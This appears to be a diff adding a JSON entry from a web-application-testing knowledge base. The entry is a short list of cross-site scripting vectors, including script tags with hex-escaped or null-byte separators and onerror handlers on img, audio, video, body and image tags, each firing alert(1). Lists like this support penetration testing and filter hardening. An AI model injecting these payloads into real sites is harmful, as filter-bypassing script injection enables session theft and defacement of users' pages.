@@ -1,0 +1,27 @@
+{
+  "id": "web_application_testing_24e1fa46624d",
+  "category": "web-application-testing",
+  "title": "xss vectors",
+  "description": "# A collection of XSS vectors\n\n```\n<script\\x20type=\"text/javascript\">javascript:alert(1);</script>\n<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x09type=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>\n<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>\n'`\"><\\x3Cscript>j",
+  "payloads": [
+    "# A collection of XSS vectors",
+    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
+    "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
+    "'`\"><\\x3Cscript>javascript:alert(1)</script>",
+    "'`\"><\\x00script>javascript:alert(1)</script>",
+    "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
+    "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
+    "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
+    "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
+    "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>"
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/web-application-testing/xss_vectors.md"
+  ]
+}
